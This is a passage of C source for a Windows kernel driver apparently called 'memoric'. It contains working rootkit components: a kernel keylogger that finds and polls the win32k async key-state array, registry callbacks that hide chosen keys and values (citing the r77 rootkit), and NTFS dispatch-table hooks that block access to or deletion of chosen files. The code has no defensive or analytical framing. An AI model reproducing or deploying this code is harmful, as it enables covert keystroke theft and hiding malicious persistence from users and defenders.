                            if ((ccode[coff] == 0x48 || ccode[coff] == 0x4C) &&
                                ccode[coff+1] == 0x8D &&
                                (ccode[coff+2] & 0xC7) == 0x05) {
                                LONG cdisp = *(PLONG)(&ccode[coff+3]);
                                ctarget = &ccode[coff+7] + cdisp;
                            } else if (ccode[coff] == 0x48 && ccode[coff+1] == 0x8B &&
                                       (ccode[coff+2] & 0xC7) == 0x05) {
                                LONG cdisp = *(PLONG)(&ccode[coff+3]);
                                ctarget = &ccode[coff+7] + cdisp;
                            }

                            if (ctarget &&
                                (ULONG_PTR)ctarget > (ULONG_PTR)base &&
                                (ULONG_PTR)ctarget < (ULONG_PTR)base + size - 64) {
                                UCHAR testBuf[64];
                                ULONG nonZero = 0;
                                ULONG j;
                                RtlCopyMemory(testBuf, ctarget, 64);
                                for (j = 0; j < 64; j++) {
                                    if (testBuf[j]) nonZero++;
                                }
                                if (nonZero <= 4) {
                                    DbgPrint("[memoric] Keylogger: gafAsyncKeyState at %p via callee %p+0x%X (nonzero=%lu)\n",
                                             ctarget, callee, coff, nonZero);
                                    return ctarget;
                                }
                            }
                        }
                    }
                }
            }
        }

        /*
         * Method 2 (fallback): Scan .data section of win32kbase.sys
         * for 48 8B 05 (MOV rax, [rip+disp32]) patterns that reference
         * a plausible 64-byte key state array.
         */
        if (ntHdr) {
            PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHdr);
            USHORT s;
            for (s = 0; s < ntHdr->FileHeader.NumberOfSections; s++) {
                /* Scan .text for references to .data */
                if (sec[s].Name[0] == '.' && sec[s].Name[1] == 't' &&
                    sec[s].Name[2] == 'e' && sec[s].Name[3] == 'x') {
                    PUCHAR textStart = (PUCHAR)base + sec[s].VirtualAddress;
                    PUCHAR textEnd = textStart + sec[s].Misc.VirtualSize - 16;
                    PUCHAR scan;
                    ULONG hitCount = 0;

                    for (scan = textStart; scan < textEnd && hitCount < 200; scan++) {
                        if (scan[0] == 0x48 && scan[1] == 0x8B && scan[2] == 0x05) {
                            LONG disp = *(PLONG)(scan + 3);
                            PVOID target = (PVOID)(scan + 7 + disp);

                            if ((ULONG_PTR)target > (ULONG_PTR)base &&
                                (ULONG_PTR)target < (ULONG_PTR)base + size - 64) {
                                UCHAR testBuf[64];
                                ULONG nonZero = 0;
                                ULONG j;
                                RtlCopyMemory(testBuf, target, 64);
                                for (j = 0; j < 64; j++) {
                                    if (testBuf[j]) nonZero++;
                                }
                                if (nonZero <= 4) {
                                    /* Additional validation: check that bytes 32-63 (recent state)
                                       also look like key state (all zero or very few bits set) */
                                    ULONG recentNonZero = 0;
                                    for (j = 32; j < 64; j++) {
                                        if (testBuf[j]) recentNonZero++;
                                    }
                                    if (recentNonZero <= 2) {
                                        DbgPrint("[memoric] Keylogger: gafAsyncKeyState at %p via .text scan (nonzero=%lu)\n",
                                                 target, nonZero);
                                        return target;
                                    }
                                }
                                hitCount++;
                            }
                        }
                    }
                    break;
                }
            }
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        /* win32kbase may not be mapped in this session context */
        DbgPrint("[memoric] Keylogger: Exception scanning win32kbase (session mapping issue?)\n");
    }

    DbgPrint("[memoric] Keylogger: gafAsyncKeyState not found\n");
    return NULL;
}

static NTSTATUS HandleKeylogger(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_KEYLOGGER_REQUEST reqCopy;
    PMEMORIC_KEYLOGGER_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_KEYLOGGER_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_KEYLOGGER_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_KEYLOGGER_REQUEST));
    resp = (PMEMORIC_KEYLOGGER_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_KEYLOGGER_RESPONSE));

    switch (reqCopy.Action) {
    case MEMORIC_KEYLOG_START:
        if (!g_KeyloggerActive) {
            g_GafAsyncKeyState = FindGafAsyncKeyState();
            if (g_GafAsyncKeyState) {
                LARGE_INTEGER dueTime, period;
                g_KeyBufferHead = 0;
                g_KeyBufferCount = 0;
                RtlZeroMemory(g_PrevKeyState, sizeof(g_PrevKeyState));
                RtlZeroMemory(g_KeyBuffer, sizeof(g_KeyBuffer));

                KeInitializeTimer(&g_KeyloggerTimer);
                KeInitializeDpc(&g_KeyloggerDpc, KeyloggerDpcRoutine, NULL);

                dueTime.QuadPart = -100000; /* 10ms */
                KeSetTimerEx(&g_KeyloggerTimer, dueTime, 10, &g_KeyloggerDpc); /* 10ms interval */

                InterlockedExchange(&g_KeyloggerActive, 1);
                resp->Success = 1;
                resp->Active = 1;
                DbgPrint("[memoric] Keylogger started, gafAsyncKeyState=%p\n", g_GafAsyncKeyState);
            } else {
                DbgPrint("[memoric] Keylogger: could not find gafAsyncKeyState\n");
            }
        } else {
            resp->Success = 1;
            resp->Active = 1;
        }
        break;

    case MEMORIC_KEYLOG_STOP:
        if (g_KeyloggerActive) {
            InterlockedExchange(&g_KeyloggerActive, 0);
            KeCancelTimer(&g_KeyloggerTimer);
            resp->Success = 1;
            DbgPrint("[memoric] Keylogger stopped\n");
        }
        break;

    case MEMORIC_KEYLOG_READ: {
        ULONG count = (ULONG)g_KeyBufferCount;
        ULONG maxKeys = reqCopy.MaxKeys;
        ULONG copyCount;
        ULONG i;

        if (maxKeys == 0 || maxKeys > 512) maxKeys = 512;
        copyCount = count < maxKeys ? count : maxKeys;

        resp->KeyCount = copyCount;
        resp->Active = g_KeyloggerActive ? 1 : 0;

        /* Copy keys from circular buffer */
        for (i = 0; i < copyCount; i++) {
            LONG idx = (g_KeyBufferHead - count + i) % 4096;
            if (idx < 0) idx += 4096;
            resp->Keys[i] = g_KeyBuffer[idx];
        }

        /* Reset buffer after read */
        InterlockedExchange(&g_KeyBufferCount, 0);
        resp->Success = 1;
        break;
    }

    case MEMORIC_KEYLOG_QUERY:
        resp->KeyCount = (ULONG)g_KeyBufferCount;
        resp->Active = g_KeyloggerActive ? 1 : 0;
        resp->Success = 1;
        break;
    }

    *bytesReturned = sizeof(MEMORIC_KEYLOGGER_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * Registry Hide — CmRegisterCallbackEx-based hiding
 *
 * Uses pre-operation callbacks to intercept:
 *   - RegNtPreQueryValueKey: block queries for hidden values
 *   - RegNtPreEnumerateKey: skip hidden sub-keys by index shifting
 *   - RegNtPreEnumerateValueKey: skip hidden values by index shifting
 *
 * Reference: r77 rootkit, windows-kernel-programming (Pavel Yosifovich)
 * ---------------------------------------------------------------- */

/* Re-entrance guard per thread for ZwEnumerateKey/ZwEnumerateValueKey calls */
#define REGHIDE_MAX_THREADS 8
static volatile HANDLE g_RegHideReentrantTids[REGHIDE_MAX_THREADS] = { 0 };

static BOOLEAN RegHideIsReentrant(void)
{
    HANDLE tid = PsGetCurrentThreadId();
    LONG i;
    for (i = 0; i < REGHIDE_MAX_THREADS; i++)
        if (g_RegHideReentrantTids[i] == tid) return TRUE;
    return FALSE;
}

static void RegHideMarkReentrant(HANDLE tid)
{
    LONG i;
    for (i = 0; i < REGHIDE_MAX_THREADS; i++) {
        if (InterlockedCompareExchangePointer(
                (PVOID*)&g_RegHideReentrantTids[i], tid, NULL) == NULL)
            return;
    }
}

static void RegHideClearReentrant(HANDLE tid)
{
    LONG i;
    for (i = 0; i < REGHIDE_MAX_THREADS; i++) {
        InterlockedCompareExchangePointer(
            (PVOID*)&g_RegHideReentrantTids[i], NULL, tid);
    }
}

/*
 * Check if a key path matches any hidden entry of the given type.
 * parentPath = the full registry path of the parent key being enumerated.
 * childName/childLen = the sub-key or value name returned by enumeration.
 * hideType: 0=key, 1=value.
 */
static BOOLEAN RegHideIsNameHidden(
    PCUNICODE_STRING parentPath,
    PCWCH childName,
    USHORT childLenBytes,
    ULONG hideType)
{
    LONG i;
    for (i = 0; i < MAX_REG_HIDE_ENTRIES; i++) {
        if (!g_RegHideEntries[i].InUse)
            continue;
        if (g_RegHideEntries[i].HideType != hideType)
            continue;

        /* For key hiding (type 0): KeyPath contains the parent where keys are hidden,
           ValueName contains the sub-key name to hide.
           For value hiding (type 1): KeyPath is the key, ValueName is the value to hide. */
        UNICODE_STRING hiddenKeyPath;
        RtlInitUnicodeString(&hiddenKeyPath, g_RegHideEntries[i].KeyPath);

        /* Check parent path match (substring) */
        if (parentPath && parentPath->Buffer && hiddenKeyPath.Length > 0) {
            if (parentPath->Length < hiddenKeyPath.Length)
                continue;
            /* Check if parent path ends with or contains the hidden key path */
            BOOLEAN pathMatch = FALSE;
            if (wcsstr(parentPath->Buffer, g_RegHideEntries[i].KeyPath) != NULL)
                pathMatch = TRUE;
            if (!pathMatch)
                continue;
        }

        /* Check child name match */
        UNICODE_STRING hiddenName;
        RtlInitUnicodeString(&hiddenName, g_RegHideEntries[i].ValueName);
        if (hiddenName.Length > 0 && childName && childLenBytes > 0) {
            UNICODE_STRING child;
            child.Buffer = (PWCH)childName;
            child.Length = childLenBytes;
            child.MaximumLength = childLenBytes;
            if (RtlCompareUnicodeString(&child, &hiddenName, TRUE) == 0)
                return TRUE;
        }
    }
    return FALSE;
}

/*
 * Extract sub-key name from KEY_INFORMATION output buffer.
 * Returns pointer to name and sets *nameLen to length in bytes.
 */
static PCWCH RegHideGetKeyName(PVOID keyInfo, KEY_INFORMATION_CLASS infoClass, PUSHORT nameLen)
{
    switch (infoClass) {
    case KeyBasicInformation: {
        typedef struct { LARGE_INTEGER LastWriteTime; ULONG TitleIndex; ULONG NameLength; WCHAR Name[1]; } KBI;
        KBI *kbi = (KBI*)keyInfo;
        *nameLen = (USHORT)kbi->NameLength;
        return kbi->Name;
    }
    case KeyNodeInformation: {
        typedef struct { LARGE_INTEGER LastWriteTime; ULONG TitleIndex; ULONG ClassOffset; ULONG ClassLength; ULONG NameLength; WCHAR Name[1]; } KNI;
        KNI *kni = (KNI*)keyInfo;
        *nameLen = (USHORT)kni->NameLength;
        return kni->Name;
    }
    default:
        *nameLen = 0;
        return NULL;
    }
}

/*
 * Extract value name from KEY_VALUE_INFORMATION output buffer.
 */
static PCWCH RegHideGetValueName(PVOID valInfo, KEY_VALUE_INFORMATION_CLASS infoClass, PUSHORT nameLen)
{
    switch (infoClass) {
    case KeyValueBasicInformation: {
        typedef struct { ULONG TitleIndex; ULONG Type; ULONG NameLength; WCHAR Name[1]; } KVBI;
        KVBI *kvbi = (KVBI*)valInfo;
        *nameLen = (USHORT)kvbi->NameLength;
        return kvbi->Name;
    }
    case KeyValueFullInformation: {
        typedef struct { ULONG TitleIndex; ULONG Type; ULONG DataOffset; ULONG DataLength; ULONG NameLength; WCHAR Name[1]; } KVFI;
        KVFI *kvfi = (KVFI*)valInfo;
        *nameLen = (USHORT)kvfi->NameLength;
        return kvfi->Name;
    }
    default:
        *nameLen = 0;
        return NULL;
    }
}

static NTSTATUS RegHideCallback(
    PVOID CallbackContext,
    PVOID Argument1,
    PVOID Argument2)
{
    REG_NOTIFY_CLASS notifyClass = (REG_NOTIFY_CLASS)(ULONG_PTR)Argument1;
    UNREFERENCED_PARAMETER(CallbackContext);

    if (g_RegHideCount == 0) return STATUS_SUCCESS;
    if (RegHideIsReentrant()) return STATUS_SUCCESS;

    switch (notifyClass) {

    /*
     * Pre-query value: If the queried value name matches a hidden entry,
     * return STATUS_OBJECT_NAME_NOT_FOUND to make it invisible.
     */
    case RegNtPreQueryValueKey: {
        PREG_QUERY_VALUE_KEY_INFORMATION info = (PREG_QUERY_VALUE_KEY_INFORMATION)Argument2;
        if (!info || !info->ValueName || !info->ValueName->Buffer)
            break;

        PCUNICODE_STRING keyPath = NULL;
        NTSTATUS st = CmCallbackGetKeyObjectIDEx(
            &g_RegHideCookie, info->Object, NULL, &keyPath, 0);
        if (!NT_SUCCESS(st) || !keyPath) break;

        BOOLEAN hidden = RegHideIsNameHidden(keyPath,
            info->ValueName->Buffer, info->ValueName->Length, 1);
        CmCallbackReleaseKeyObjectIDEx(keyPath);

        if (hidden) {
            DbgPrint("[memoric] RegHide: Blocked query for value '%wZ'\n", info->ValueName);
            return STATUS_OBJECT_NAME_NOT_FOUND;
        }
        break;
    }

    /*
     * Post-enumerate key: Check if the returned sub-key name matches a hidden
     * entry. If so, re-enumerate with incrementing index to skip it.
     * Uses ObOpenObjectByPointerWithTag + ZwEnumerateKey with re-entrance guard.
     */
    case RegNtPostEnumerateKey: {
        PREG_POST_OPERATION_INFORMATION postInfo = (PREG_POST_OPERATION_INFORMATION)Argument2;
        if (!NT_SUCCESS(postInfo->Status) || !postInfo->PreInformation)
            break;

        PREG_ENUMERATE_KEY_INFORMATION preInfo =
            (PREG_ENUMERATE_KEY_INFORMATION)postInfo->PreInformation;
        if (!preInfo->KeyInformation)
            break;

        PCUNICODE_STRING keyPath = NULL;
        NTSTATUS st = CmCallbackGetKeyObjectIDEx(
            &g_RegHideCookie, postInfo->Object, NULL, &keyPath, 0);
        if (!NT_SUCCESS(st) || !keyPath) break;

        /* Extract the enumerated sub-key name */
        USHORT nameLen = 0;
        PCWCH name = RegHideGetKeyName(preInfo->KeyInformation,
                                        preInfo->KeyInformationClass, &nameLen);
        if (!name || nameLen == 0) {
            CmCallbackReleaseKeyObjectIDEx(keyPath);
            break;
        }

        BOOLEAN hidden = RegHideIsNameHidden(keyPath, name, nameLen, 0);
        if (hidden) {
            /* Open handle to the key object for ZwEnumerateKey call */
            HANDLE keyHandle = NULL;
            st = ObOpenObjectByPointer(postInfo->Object, OBJ_KERNEL_HANDLE,
                NULL, KEY_READ, *CmKeyObjectType, KernelMode, &keyHandle);
            if (NT_SUCCESS(st)) {
                HANDLE tid = PsGetCurrentThreadId();
                RegHideMarkReentrant(tid);

                /* Try next indices until we find a non-hidden entry or run out */
                ULONG nextIdx = preInfo->Index + 1;
                ULONG retLen = 0;
                BOOLEAN found = FALSE;
                while (!found) {
                    st = ZwEnumerateKey(keyHandle, nextIdx,
                        preInfo->KeyInformationClass,
                        preInfo->KeyInformation,
                        preInfo->Length, &retLen);
                    if (!NT_SUCCESS(st)) {
                        /* No more entries or error — propagate */
                        postInfo->ReturnStatus = st;
                        if (preInfo->ResultLength)
                            *preInfo->ResultLength = 0;
                        break;
                    }
                    /* Check if this result is also hidden */
                    USHORT nl2 = 0;
                    PCWCH n2 = RegHideGetKeyName(preInfo->KeyInformation,
                                               preInfo->KeyInformationClass, &nl2);
                    if (n2 && nl2 > 0 && RegHideIsNameHidden(keyPath, n2, nl2, 0)) {
                        nextIdx++;
                        continue; /* Skip this one too */
                    }
                    /* Found a non-hidden entry — update result length */
                    if (preInfo->ResultLength)
                        *preInfo->ResultLength = retLen;
                    postInfo->ReturnStatus = STATUS_SUCCESS;
                    found = TRUE;
                }

                RegHideClearReentrant(tid);
                ZwClose(keyHandle);
            }
        }
        CmCallbackReleaseKeyObjectIDEx(keyPath);
        break;
    }

    /*
     * Post-enumerate value key: same approach as key enumeration hiding.
     */
    case RegNtPostEnumerateValueKey: {
        PREG_POST_OPERATION_INFORMATION postInfo = (PREG_POST_OPERATION_INFORMATION)Argument2;
        if (!NT_SUCCESS(postInfo->Status) || !postInfo->PreInformation)
            break;

        PREG_ENUMERATE_VALUE_KEY_INFORMATION preInfo =
            (PREG_ENUMERATE_VALUE_KEY_INFORMATION)postInfo->PreInformation;
        if (!preInfo->KeyValueInformation)
            break;

        PCUNICODE_STRING keyPath = NULL;
        NTSTATUS st = CmCallbackGetKeyObjectIDEx(
            &g_RegHideCookie, postInfo->Object, NULL, &keyPath, 0);
        if (!NT_SUCCESS(st) || !keyPath) break;

        USHORT nameLen = 0;
        PCWCH name = RegHideGetValueName(preInfo->KeyValueInformation,
                                          preInfo->KeyValueInformationClass, &nameLen);
        if (!name || nameLen == 0) {
            CmCallbackReleaseKeyObjectIDEx(keyPath);
            break;
        }

        BOOLEAN hidden = RegHideIsNameHidden(keyPath, name, nameLen, 1);
        if (hidden) {
            HANDLE keyHandle = NULL;
            st = ObOpenObjectByPointer(postInfo->Object, OBJ_KERNEL_HANDLE,
                NULL, KEY_READ, *CmKeyObjectType, KernelMode, &keyHandle);
            if (NT_SUCCESS(st)) {
                HANDLE tid = PsGetCurrentThreadId();
                RegHideMarkReentrant(tid);

                ULONG nextIdx = preInfo->Index + 1;
                ULONG retLen = 0;
                BOOLEAN found = FALSE;
                while (!found) {
                    st = ZwEnumerateValueKey(keyHandle, nextIdx,
                        preInfo->KeyValueInformationClass,
                        preInfo->KeyValueInformation,
                        preInfo->Length, &retLen);
                    if (!NT_SUCCESS(st)) {
                        postInfo->ReturnStatus = st;
                        if (preInfo->ResultLength)
                            *preInfo->ResultLength = 0;
                        break;
                    }
                    USHORT nl2 = 0;
                    PCWCH n2 = RegHideGetValueName(preInfo->KeyValueInformation,
                                                   preInfo->KeyValueInformationClass, &nl2);
                    if (n2 && nl2 > 0 && RegHideIsNameHidden(keyPath, n2, nl2, 1)) {
                        nextIdx++;
                        continue;
                    }
                    if (preInfo->ResultLength)
                        *preInfo->ResultLength = retLen;
                    postInfo->ReturnStatus = STATUS_SUCCESS;
                    found = TRUE;
                }

                RegHideClearReentrant(tid);
                ZwClose(keyHandle);
            }
        }
        CmCallbackReleaseKeyObjectIDEx(keyPath);
        break;
    }

    default:
        break;
    }

    return STATUS_SUCCESS;
}

static NTSTATUS HandleRegHide(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_REG_HIDE_REQUEST reqCopy;
    PMEMORIC_REG_HIDE_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_REG_HIDE_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_REG_HIDE_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_REG_HIDE_REQUEST));
    resp = (PMEMORIC_REG_HIDE_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_REG_HIDE_RESPONSE));

    switch (reqCopy.Action) {
    case MEMORIC_REG_HIDE_ADD: {
        LONG i;
        /* Register callback if not yet done */
        if (!g_RegHideCallbackRegistered) {
            UNICODE_STRING altitude;
            RtlInitUnicodeString(&altitude, L"380000");
            NTSTATUS st = CmRegisterCallbackEx(RegHideCallback, &altitude,
                                                g_DeviceObject->DriverObject, NULL,
                                                &g_RegHideCookie, NULL);
            if (NT_SUCCESS(st)) {
                g_RegHideCallbackRegistered = TRUE;
                DbgPrint("[memoric] RegHide: Callback registered\n");
            } else {
                DbgPrint("[memoric] RegHide: CmRegisterCallbackEx failed 0x%08X\n", st);
                break;
            }
        }

        /* Find free slot */
        for (i = 0; i < MAX_REG_HIDE_ENTRIES; i++) {
            if (!g_RegHideEntries[i].InUse) {
                g_RegHideEntries[i].InUse = TRUE;
                g_RegHideEntries[i].HideType = reqCopy.HideType;
                RtlCopyMemory(g_RegHideEntries[i].KeyPath, reqCopy.KeyPath, sizeof(reqCopy.KeyPath));
                RtlCopyMemory(g_RegHideEntries[i].ValueName, reqCopy.ValueName, sizeof(reqCopy.ValueName));
                InterlockedIncrement(&g_RegHideCount);
                resp->HiddenCount = 1;
                resp->Success = 1;
                DbgPrint("[memoric] RegHide: Added entry %ld (type=%lu)\n", i, reqCopy.HideType);
                break;
            }
        }
        resp->TotalHidden = (ULONG)g_RegHideCount;
        break;
    }

    case MEMORIC_REG_HIDE_REMOVE: {
        LONG i;
        for (i = 0; i < MAX_REG_HIDE_ENTRIES; i++) {
            if (g_RegHideEntries[i].InUse &&
                _wcsnicmp(g_RegHideEntries[i].KeyPath, reqCopy.KeyPath, 256) == 0) {
                g_RegHideEntries[i].InUse = FALSE;
                InterlockedDecrement(&g_RegHideCount);
                resp->HiddenCount = 1;
                resp->Success = 1;
                break;
            }
        }
        resp->TotalHidden = (ULONG)g_RegHideCount;
        break;
    }

    case MEMORIC_REG_HIDE_LIST:
        resp->TotalHidden = (ULONG)g_RegHideCount;
        resp->Success = 1;
        break;

    case MEMORIC_REG_HIDE_CLEAR: {
        LONG i;
        for (i = 0; i < MAX_REG_HIDE_ENTRIES; i++) {
            g_RegHideEntries[i].InUse = FALSE;
        }
        resp->HiddenCount = (ULONG)g_RegHideCount;
        InterlockedExchange(&g_RegHideCount, 0);
        resp->TotalHidden = 0;
        resp->Success = 1;

        /* Unregister callback */
        if (g_RegHideCallbackRegistered) {
            CmUnRegisterCallback(g_RegHideCookie);
            g_RegHideCallbackRegistered = FALSE;
        }
        break;
    }
    }

    *bytesReturned = sizeof(MEMORIC_REG_HIDE_RESPONSE);
    return STATUS_SUCCESS;
}

/* ----------------------------------------------------------------
 * File Lock — Protect files from user-mode access
 * Uses NTFS IRP dispatch table hooking to intercept file operations
 * ---------------------------------------------------------------- */

/*
 * Check if a file path matches any locked entry.
 * Returns the matching entry or NULL.
 */
static FILE_LOCK_ENTRY* FileLockFindMatch(PUNICODE_STRING fileName)
{
    if (!fileName || !fileName->Buffer || fileName->Length == 0) return NULL;
    if (g_FileLockCount == 0) return NULL;

    for (LONG i = 0; i < MAX_FILE_LOCK_ENTRIES; i++) {
        if (!g_FileLockEntries[i].InUse) continue;

        UNICODE_STRING lockPath;
        RtlInitUnicodeString(&lockPath, g_FileLockEntries[i].FilePath);

        /* Check if the file path ends with or contains the lock path */
        if (fileName->Length >= lockPath.Length) {
            UNICODE_STRING suffix;
            suffix.Buffer = fileName->Buffer +
                (fileName->Length / sizeof(WCHAR)) - (lockPath.Length / sizeof(WCHAR));
            suffix.Length = lockPath.Length;
            suffix.MaximumLength = lockPath.Length;
            if (RtlCompareUnicodeString(&suffix, &lockPath, TRUE) == 0) {
                return &g_FileLockEntries[i];
            }
        }
    }
    return NULL;
}

/* Hooked IRP_MJ_CREATE for NTFS */
static NTSTATUS FileLockCreateHook(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

    if (g_FileLockCount > 0 && irpSp->FileObject && irpSp->FileObject->FileName.Buffer) {
        FILE_LOCK_ENTRY *entry = FileLockFindMatch(&irpSp->FileObject->FileName);
        if (entry) {
            /* Check if caller PID is allowed */
            ULONG callerPid = (ULONG)(ULONG_PTR)PsGetCurrentProcessId();
            if (entry->AllowedPid != 0 && callerPid == entry->AllowedPid) {
                goto passthrough_create;
            }

            /* Check protect flags:
             *   0x01 = block open (all)
             *   0x02 = block write access
             *   0x04 = block delete access
             */
            ACCESS_MASK desiredAccess = irpSp->Parameters.Create.SecurityContext ?
                irpSp->Parameters.Create.SecurityContext->DesiredAccess : 0;

            BOOLEAN deny = FALSE;
            if (entry->ProtectFlags & 0x01) {
                deny = TRUE; /* block all opens */
            }
            if ((entry->ProtectFlags & 0x02) &&
                (desiredAccess & (FILE_WRITE_DATA | FILE_APPEND_DATA | GENERIC_WRITE))) {
                deny = TRUE;
            }
            if ((entry->ProtectFlags & 0x04) &&
                (desiredAccess & DELETE)) {
                deny = TRUE;
            }

            if (deny) {
                Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
                Irp->IoStatus.Information = 0;
                IoCompleteRequest(Irp, IO_NO_INCREMENT);
                return STATUS_ACCESS_DENIED;
            }
        }
    }

passthrough_create:
    if (g_OrigNtfsCreate) {
        return g_OrigNtfsCreate(DeviceObject, Irp);
    }
    Irp->IoStatus.Status = STATUS_INTERNAL_ERROR;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_INTERNAL_ERROR;
}

/* Hooked IRP_MJ_SET_INFORMATION for NTFS (blocks rename/delete) */
static NTSTATUS FileLockSetInfoHook(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

    if (g_FileLockCount > 0 && irpSp->FileObject && irpSp->FileObject->FileName.Buffer) {
        FILE_INFORMATION_CLASS infoClass = irpSp->Parameters.SetFile.FileInformationClass;

        /* Check for rename, delete, and disposition operations */
        if (infoClass == FileRenameInformation ||
            infoClass == FileDispositionInformation ||
            infoClass == 64 /* FileDispositionInformationEx */) {

            FILE_LOCK_ENTRY *entry = FileLockFindMatch(&irpSp->FileObject->FileName);
            if (entry) {
                ULONG callerPid = (ULONG)(ULONG_PTR)PsGetCurrentProcessId();
                if (entry->AllowedPid == 0 || callerPid != entry->AllowedPid) {
                    if (entry->ProtectFlags & 0x04) { /* delete/rename protection */
                        Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
                        Irp->IoStatus.Information = 0;
                        IoCompleteRequest(Irp, IO_NO_INCREMENT);
                        return STATUS_ACCESS_DENIED;
                    }
                }
            }
        }
    }

    if (g_OrigNtfsSetInfo) {
        return g_OrigNtfsSetInfo(DeviceObject, Irp);
    }
    Irp->IoStatus.Status = STATUS_INTERNAL_ERROR;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_INTERNAL_ERROR;
}

/* Install/remove NTFS IRP hooks */
static NTSTATUS FileLockInstallHooks(void)
{
    if (g_FileLockHookInstalled) return STATUS_SUCCESS;

    UNICODE_STRING ntfsName;
    RtlInitUnicodeString(&ntfsName, L"\\FileSystem\\Ntfs");

    NTSTATUS st = ObReferenceObjectByName(
        &ntfsName, OBJ_CASE_INSENSITIVE, NULL, 0,
        *IoDriverObjectType, KernelMode, NULL,
        (PVOID*)&g_NtfsDriverObject);

    if (!NT_SUCCESS(st)) {
        DbgPrint("[memoric] FileLock: Failed to find NTFS driver: 0x%08X\n", st);
        return st;
    }

    /* Save originals and install hooks via InterlockedExchangePointer */
    g_OrigNtfsCreate = (PDRIVER_DISPATCH)InterlockedExchangePointer(
        (PVOID*)&g_NtfsDriverObject->MajorFunction[IRP_MJ_CREATE],
        (PVOID)FileLockCreateHook);

    g_OrigNtfsSetInfo = (PDRIVER_DISPATCH)InterlockedExchangePointer(
        (PVOID*)&g_NtfsDriverObject->MajorFunction[IRP_MJ_SET_INFORMATION],
        (PVOID)FileLockSetInfoHook);

    g_FileLockHookInstalled = TRUE;
    DbgPrint("[memoric] FileLock: NTFS IRP hooks installed\n");
    return STATUS_SUCCESS;
}

static VOID FileLockRemoveHooks(void)
{
    if (!g_FileLockHookInstalled || !g_NtfsDriverObject) return;

    if (g_OrigNtfsCreate) {
        InterlockedExchangePointer(
            (PVOID*)&g_NtfsDriverObject->MajorFunction[IRP_MJ_CREATE],
            (PVOID)g_OrigNtfsCreate);
        g_OrigNtfsCreate = NULL;
    }
    if (g_OrigNtfsSetInfo) {
        InterlockedExchangePointer(
            (PVOID*)&g_NtfsDriverObject->MajorFunction[IRP_MJ_SET_INFORMATION],
            (PVOID)g_OrigNtfsSetInfo);
        g_OrigNtfsSetInfo = NULL;
    }

    ObDereferenceObject(g_NtfsDriverObject);
    g_NtfsDriverObject = NULL;
    g_FileLockHookInstalled = FALSE;
    DbgPrint("[memoric] FileLock: NTFS IRP hooks removed\n");
}

static NTSTATUS HandleFileLock(
    PVOID systemBuffer,
    ULONG inputLength,
    ULONG outputLength,
    PULONG bytesReturned)
{
    MEMORIC_FILE_LOCK_REQUEST reqCopy;
    PMEMORIC_FILE_LOCK_RESPONSE resp;

    if (inputLength < sizeof(MEMORIC_FILE_LOCK_REQUEST))
        return STATUS_BUFFER_TOO_SMALL;
    if (outputLength < sizeof(MEMORIC_FILE_LOCK_RESPONSE))
        return STATUS_BUFFER_TOO_SMALL;

    RtlCopyMemory(&reqCopy, systemBuffer, sizeof(MEMORIC_FILE_LOCK_REQUEST));
    resp = (PMEMORIC_FILE_LOCK_RESPONSE)systemBuffer;
    RtlZeroMemory(resp, sizeof(MEMORIC_FILE_LOCK_RESPONSE));

    switch (reqCopy.Action) {
    case MEMORIC_FILE_LOCK_ADD: {
        /* Install NTFS hooks if not yet active */
        if (!g_FileLockHookInstalled) {
            NTSTATUS hookSt = FileLockInstallHooks();
            if (!NT_SUCCESS(hookSt)) {
                resp->Success = 0;
                *bytesReturned = sizeof(MEMORIC_FILE_LOCK_RESPONSE);
                return hookSt;
            }
        }

        LONG i;
        for (i = 0; i < MAX_FILE_LOCK_ENTRIES; i++) {
            if (!g_FileLockEntries[i].InUse) {
                g_FileLockEntries[i].InUse = TRUE;
                g_FileLockEntries[i].ProtectFlags = reqCopy.ProtectFlags;
                RtlCopyMemory(g_FileLockEntries[i].FilePath, reqCopy.FilePath, sizeof(reqCopy.FilePath));
                g_FileLockEntries[i].AllowedPid = reqCopy.AllowedPid;
                InterlockedIncrement(&g_FileLockCount);
                resp->LockedCount = 1;
                resp->Success = 1;
                DbgPrint("[memoric] FileLock: Protected entry %ld (flags=0x%X)\n", i, reqCopy.ProtectFlags);
                break;
            }
        }
        resp->TotalLocked = (ULONG)g_FileLockCount;
        break;
    }

    case MEMORIC_FILE_LOCK_REMOVE: {
        LONG i;
        for (i = 0; i < MAX_FILE_LOCK_ENTRIES; i++) {
            if (g_FileLockEntries[i].InUse &&
                _wcsnicmp(g_FileLockEntries[i].FilePath, reqCopy.FilePath, 260) == 0) {
                g_FileLockEntries[i].InUse = FALSE;
                InterlockedDecrement(&g_FileLockCount);
                resp->LockedCount = 1;
                resp->Success = 1;
                break;
            }
        }
        resp->TotalLocked = (ULONG)g_FileLockCount;

        /* Remove hooks if no files are locked anymore */
        if (g_FileLockCount <= 0) {
            FileLockRemoveHooks();
        }
        break;
    }

    case MEMORIC_FILE_LOCK_LIST:
        resp->TotalLocked = (ULONG)g_FileLockCount;
        resp->Success = 1;
        break;

